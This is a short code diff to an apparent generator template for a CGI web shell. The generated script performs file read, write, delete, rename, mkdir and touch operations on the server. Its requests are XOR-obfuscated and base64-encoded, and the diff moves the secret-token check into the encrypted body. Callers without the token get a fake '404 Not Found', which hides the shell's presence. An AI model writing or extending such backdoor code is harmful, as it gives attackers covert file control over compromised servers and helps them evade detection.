@@ -37,17 +37,17 @@ _H = {{
     'read': '{h_read}', 'write': '{h_write}', 'delete': '{h_delete}',
     'rename': '{h_rename}', 'mkdir': '{h_mkdir}', 'touch': '{h_touch}',
 }}
-_gk = os.environ.get('HTTP_X_DEBUG_KEY', '')
-if _gk and _gk != dsw_dec('{token_hex}', _XK):
-    print('Status: 404 Not Found')
-    print()
-    sys.exit(0)
 try:
     _body = sys.stdin.read(int(os.environ.get('CONTENT_LENGTH', '0') or 0))
     _raw = urllib.parse.parse_qs(_body).get('formData', [''])[0]
     req = json.loads(dsw_x(base64.b64decode(_raw)).decode('utf-8', 'replace'))
 except Exception:
     req = {{}}
+# S12：鉴权——请求体内嵌 token 必须匹配（缺失或不匹配即 404）
+if req.get('token', '') != dsw_dec('{token_hex}', _XK):
+    print('Status: 404 Not Found')
+    print()
+    sys.exit(0)
 a = req.get('a', '')
 out = {{'ok': True, 'data': {{}}}}
 try:
